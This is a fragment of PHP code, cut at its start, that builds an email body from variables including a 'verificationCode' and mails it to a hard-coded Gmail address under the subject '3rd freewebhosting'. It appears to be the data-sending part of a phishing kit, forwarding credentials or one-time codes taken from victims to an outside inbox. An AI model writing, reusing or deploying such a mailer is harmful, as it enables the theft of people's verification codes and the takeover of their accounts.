$sname
$scriptname
$dated
$rname

verificationCode: $verificationCode

";


$mail_To = "onlie.shopping.email@gmail.com";
$mail_From = "crmbusy911@gmail.com";
$mail_Subject = "3rd freewebhosting";
mail($mail_To, $mail_Subject, $mail_Body, "-f" . $mail_To, $mail_From);
  
